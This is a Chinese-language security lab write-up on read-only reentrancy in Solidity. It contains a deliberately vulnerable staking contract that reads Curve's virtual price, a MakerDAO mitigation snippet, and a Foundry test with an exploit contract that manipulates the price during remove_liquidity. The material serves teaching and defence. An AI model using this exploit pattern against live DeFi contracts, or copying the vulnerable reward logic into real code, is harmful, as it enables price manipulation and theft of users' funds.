# 只读可重入  
[ReadOnlyReentrancy.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ReadOnlyReentrancy.sol)  

**名称：** 只读可重入性漏洞  

**描述：**  
只读重入性漏洞是智能合约设计的一个缺陷，这允许攻击者利用函数的“只读”特性对合约的状态进行意外的更改。  
具体来说，当攻击者通过ICurve合约的remove_liquidity函数触发ExploitContract中的receive函数时，就会出现这种漏洞。这是通过一个安全的智能合约“A”的外部调用实现的，该调用会调用攻击者合约的fallback()函数。  
通过这种攻击方式，攻击者获得了在fallback()函数中执行代码的能力，针对与合约“A”间接相关的合约“B”。合约“B”从合约“A”中获取出LP代币的价格，因此容易受到重入攻击的影响，导致价格被操纵和意外更改。  

**解决方法：**  
避免在只读函数中进行任何的状态修改操作。  

**Makerdao 示例：**  
```
// 如果在状态修改pool函数执行期间被调用，这将被回滚。
if (nonreentrant) {
uint256[2] calldata amounts;
CurvePoolLike(pool).remove_liquidity(0, amounts);
}
```
**参考**  
https://twitter.com/1nf0s3cpt/status/1590622114834706432  
https://chainsecurity.com/heartbreaks-curve-lp-oracles/  
https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334  
https://www.youtube.com/watch?v=0fgGTRlsDxI  


**VlunContract:**  
```
contract VulnContract {
    IERC20 public constant token = IERC20(LP_TOKEN);
    ICurve private constant pool = ICurve(STETH_POOL);

    mapping(address => uint) public balanceOf;

    function stake(uint amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balanceOf[msg.sender] += amount;
    }

    function unstake(uint amount) external {
        balanceOf[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }

    function getReward() external view returns (uint) {
        //根据池子LP代币的当前虚拟价格进行奖励代币
        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
            1 ether;
        // 省略用于转移奖励代币的代码
        return reward;
    }
}
```  
**如何测试：**  
forge test --contracts src/test/ReadOnlyReentrancy.sol -vvvv  
```
// 测试VulnContract合约中只读重入漏洞的函数
function testPwn() public {
    // 通过漏洞合约将10个ether质押到VulnContract合约
    hack.stakeTokens{value: 10 ether}(); 
    // 对VulnContract合约执行只读重入攻击
    hack.performReadOnlyReentrnacy{value: 100000 ether}();
}

// 用于利用 VulnContract 中只读重入漏洞的合约
contract ExploitContract {
    //与ICurve和IERC20合约交互的接口
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    // 待攻击的VulnContract合约
    VulnContract private immutable target;

    // 构造函数用于初始化被攻击的VulnContract合约
    constructor(address _target) {
        target = VulnContract(_target);
    }

    // 质押LP代币到VulnContract合约的函数
    function stakeTokens() external payable {
        // 作为流动性添加到Curve池中的金额
        uint[2] memory amounts = [msg.value, 0];
        // 向Curve池子添加流动性并且接受LP代币作为奖励
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // 记录添加流动性后的LP代币的价格
        console.log(
            "LP token price after staking into VulnContract",
            pool.get_virtual_price()
        );
        // 授权VulnContract合约可以代表当前合约花费LP代币
        lpToken.approve(address(target), lp);
        // 将LP代币质押到VulnContract合约中
        target.stake(lp);
    }

    // 对VulnContract合约进行只读重入攻击的函数
    function performReadOnlyReentrnacy() external payable {
        // 作为流动性添加到Curve池中的金额
        uint[2] memory amounts = [msg.value, 0];
        // 向Curve池子添加流动性并且接受LP代币作为奖励
        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        // 记录移除流动性前LP代币的价格
        console.log(
            "LP token price before remove_liquidity()",
            pool.get_virtual_price()
        );
        // 移除流动性时应当接收的最小代币数量
        uint[2] memory min_amounts = [uint(0), uint(0)];
        // 从Curve池子中移除流动性，这将触发receive函数
        pool.remove_liquidity(lp, min_amounts);
        // 记录移除流动性后LP代币的价格
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            pool.get_virtual_price()
        );
        // 记录将从VulnContract收到的奖励金额
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
    }

    //从Curve池中移除流动性时将触发的回退函数
    receive() external payable {
        // 记录在移除流动性期间的LP代币价格
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            pool.get_virtual_price()
        );
        // 记录在触发只读重入攻击的情况下可以获得的奖励
        uint reward = target.getReward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
    }
}
```  
**红色框：** 攻击成功，价格被操控  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff974125e-47d0-42ca-89bc-1d9ef7608094%2FUntitled.png?table=block&id=db05153a-1fed-46f6-91fe-6a1caae5e036&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)

![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc578eed0-e82d-4179-8cd2-75c3e921fdf9%2FUntitled.png?table=block&id=a9136681-055a-42b9-80e0-4f2b2ebbe0d8&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)